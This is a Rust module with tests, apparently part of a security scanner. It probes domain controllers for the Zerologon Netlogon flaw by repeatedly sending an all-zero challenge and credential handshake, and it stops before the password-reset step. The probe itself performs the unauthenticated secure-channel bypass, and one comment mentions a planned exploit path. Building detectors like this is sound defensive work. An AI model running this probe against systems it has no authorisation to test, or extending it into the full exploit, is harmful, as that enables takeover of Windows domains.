//! MS-NRPC (Netlogon) — enough of the secure-channel setup to **detect Zerologon**
//! (CVE-2020-1472) without touching the machine password.
//!
//! The flaw: with AES-CFB8 and an all-zero IV, encrypting an all-zero plaintext yields all-zero
//! ciphertext with probability ~1/256. `NetrServerAuthenticate3` verifies the client credential by
//! computing exactly that, so sending an all-zero `ClientChallenge` + all-zero `ClientCredential`
//! and retrying makes the KDC accept an *unauthenticated* secure channel ~1 attempt in 256. If any
//! `NetrServerAuthenticate3` returns `STATUS_SUCCESS`, the DC is vulnerable.
//!
//! **This module only detects.** It never calls `NetrServerPasswordSet2` — the destructive step
//! that zeroes the machine password and breaks the DC. Detection ≠ exploitation.

use crate::ndr::NdrEncoder;
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};

/// The Netlogon RPC interface (MS-NRPC), reachable over ncacn_ip_tcp via the endpoint mapper.
pub fn netlogon_syntax() -> Syntax {
    Syntax::new("12345678-1234-abcd-ef00-01234567cffb", 1, 0)
}

pub mod opnum {
    pub const REQ_CHALLENGE: u16 = 4;
    pub const AUTHENTICATE3: u16 = 26;
}

/// NETLOGON_SECURE_CHANNEL_TYPE::ServerSecureChannel (a DC authenticating to a DC).
const SERVER_SECURE_CHANNEL: u16 = 6;
/// Negotiate flags including the AES support bit (0x0100_0000) that selects the vulnerable path.
const NEG_FLAGS: u32 = 0x212f_ffff;
const STATUS_SUCCESS: u32 = 0x0000_0000;

/// NetrServerReqChallenge(PrimaryName[unique,str], ComputerName[str], ClientChallenge[8]).
fn encode_req_challenge(netbios: &str, client_challenge: &[u8; 8]) -> Vec<u8> {
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique, non-null)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName (ref, inline)
    e.align(4);
    e.bytes(client_challenge); // NETLOGON_CREDENTIAL
    e.into_bytes()
}

/// NetrServerAuthenticate3(PrimaryName[unique,str], AccountName[str], SecureChannelType,
/// ComputerName[str], ClientCredential[8], NegotiateFlags[in,out]).
fn encode_authenticate3(netbios: &str, client_cred: &[u8; 8]) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account); // AccountName (ref)
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL); // SecureChannelType (enum, 2 bytes)
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName (ref)
    e.align(4);
    e.bytes(client_cred); // ClientCredential
    e.u32(NEG_FLAGS); // NegotiateFlags [in,out]
    e.into_bytes()
}

/// Trailing NTSTATUS of a Netlogon reply (last 4 bytes of the stub).
fn ret_status(stub: &[u8]) -> u32 {
    stub.get(stub.len().wrapping_sub(4)..)
        .and_then(|b| b.try_into().ok())
        .map(u32::from_le_bytes)
        .unwrap_or(0xFFFF_FFFF)
}

/// Outcome of a Zerologon probe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Zerologon {
    /// A NetrServerAuthenticate3 accepted the all-zero credential — the DC is vulnerable.
    Vulnerable { attempts: u32 },
    /// Every attempt was rejected (STATUS_ACCESS_DENIED) — patched / not vulnerable.
    NotVulnerable { attempts: u32 },
}

/// Safe Zerologon detection: bind Netlogon over ncacn_ip_tcp and try the all-zero
/// challenge/credential handshake up to `max_attempts` (impacket uses 2000; success is expected
/// within ~256 on a vulnerable DC). Returns as soon as one attempt succeeds. Never resets the
/// machine password.
pub async fn detect_zerologon(host: &str, netbios: &str, max_attempts: u32) -> Result<Zerologon> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;

    let zero = [0u8; 8];
    for attempt in 1..=max_attempts {
        // Establish a fresh challenge pair, then try to authenticate with all-zeros.
        let _ = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            return Ok(Zerologon::Vulnerable { attempts: attempt });
        }
    }
    Ok(Zerologon::NotVulnerable {
        attempts: max_attempts,
    })
}

// (helper kept for the eventual --exploit path's callers; unused by detection)
#[allow(dead_code)]
fn _rpc_err(msg: &str) -> RpcError {
    RpcError::Protocol(msg.into())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn syntax_uuid() {
        // Netlogon interface UUID parses.
        let s = netlogon_syntax();
        assert_eq!(s.ver_major, 1);
    }

    #[test]
    fn req_challenge_layout() {
        let b = encode_req_challenge("DC01", &[0u8; 8]);
        // PrimaryName referent (non-null) then the conformant wstr max_count = len("DC01")+1 = 5.
        assert_ne!(u32::from_le_bytes(b[0..4].try_into().unwrap()), 0);
        assert_eq!(u32::from_le_bytes(b[4..8].try_into().unwrap()), 5);
        // ends with the 8-byte all-zero client challenge.
        assert_eq!(&b[b.len() - 8..], &[0u8; 8]);
    }

    #[test]
    fn authenticate3_ends_with_flags() {
        let b = encode_authenticate3("DC01", &[0u8; 8]);
        assert_eq!(&b[b.len() - 4..], &NEG_FLAGS.to_le_bytes());
    }

    #[test]
    fn ret_status_reads_tail() {
        assert_eq!(ret_status(&[0, 0, 0, 0, 0, 0, 0, 0]), 0);
        assert_eq!(ret_status(&0xC000_0022u32.to_le_bytes()), 0xC000_0022);
    }
}
